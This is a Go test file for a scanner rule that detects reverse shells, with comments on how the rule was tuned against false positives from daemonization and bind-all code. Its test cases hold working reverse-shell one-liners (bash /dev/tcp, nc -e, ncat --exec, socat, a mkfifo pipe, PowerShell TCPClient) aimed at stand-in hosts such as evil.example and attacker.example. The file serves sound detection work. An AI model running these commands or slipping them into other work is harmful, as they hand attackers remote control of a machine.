package rules

import "testing"

// TestReverseShellNeedsTheIdiomUsedNotListed pins the cycle-139 polish of
// SG-NET-006.
//
// Going in, the rule had **13 findings across 1,148 bundles in two corpora and
// zero true positives** (#302). Two of its weaker leaves matched code that is
// not the idiom at all:
//
//   - os.dup2(<fd>.fileno(), 1) is *daemonization* when the fd is a log file or
//     /dev/null, and a reverse shell only when it is a socket. Both dup onto
//     stdio, so the leaf cannot tell them apart; the benign source sits on the
//     same line, which a line-scoped suppress can see.
//   - the bare bind-all leaf matched ordinary servers. Binding is the *opposite*
//     of a reverse shell, which connects outward, and it is removed here.
//
// The `false` rows are verbatim lines from the 2026-09-15 skillsmp sweep.
func TestReverseShellNeedsTheIdiomUsedNotListed(t *testing.T) {
	r := ruleByID(t, "SG-NET-006")
	cases := []struct {
		name string
		text string
		want bool
	}{
		// --- daemonization is not a reverse shell (sweep: 3 hits) ---
		{"fp: stdout to a log file", "os.dup2(log.fileno(), 1)\n", false},
		{"fp: stderr to a log file", "os.dup2(log.fileno(), 2)\n", false},
		{"fp: stdin from devnull", "os.dup2(devnull.fileno(), 0)\n", false},
		{"fp: named logfile handle", "os.dup2(logfile.fileno(), 1)\n", false},
		{"fp: sys.stdout handle", "os.dup2(sys.stdout.fileno(), 1)\n", false},

		// --- bind-all is NOT carved out here, deliberately ---
		// The sweep found 4 benign hits (a router, a port check) and the first
		// draft of this cycle removed the leaf for them. That was wrong:
		// testdata/malicious/setup.sh carries a deliberate `::` bind-all
		// listener pinned by TestMaliciousFixtureTriggersIPv6BindAll, so the
		// shape has a real true positive. Benign server and hostile listener
		// are *textually identical*, which makes this a severity/context
		// question rather than a pattern one — filed to the backlog, not
		// decided here. These rows assert the coverage is still live.
		{"bind-all still fires (ipv4)", `s.bind(("0.0.0.0", 8080))`, true},
		{"bind-all still fires (ipv6)", `s.bind(("::", 8080))`, true},

		// --- the socket form is still the rule's job ---
		{"socket fd duped onto stdout", "os.dup2(s.fileno(), 1)\n", true},
		{"socket fd duped onto stdin", "os.dup2(sock.fileno(), 0)\n", true},
		{"conn fd duped", "os.dup2(conn.fileno(), 2)\n", true},

		// --- every strong leaf still fires ---
		{"bash /dev/tcp", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n", true},
		{"sh -i to /dev/tcp", "sh -i >& /dev/tcp/evil.example/9001 0>&1\n", true},
		{"exec fd to /dev/tcp", "exec 5<>/dev/tcp/evil.example/9001\n", true},
		{"nc -e a shell", "nohup nc -e /bin/sh attacker.example 4444 &\n", true},
		{"ncat --exec", "ncat --exec /bin/bash attacker.example 4444\n", true},
		{"socat EXEC", "socat TCP:evil.example:4444 EXEC:/bin/sh\n", true},
		{"mkfifo backpipe", "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc evil.example 4444 > /tmp/f\n", true},
		{"pty.spawn a shell", `pty.spawn("/bin/bash")`, true},
		{"powershell TCPClient", "$c = New-Object System.Net.Sockets.TCPClient('evil.example',4444)\n", true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := len(r.Evaluate("scripts", c.text)) > 0; got != c.want {
				t.Errorf("match=%v, want %v", got, c.want)
			}
		})
	}
}
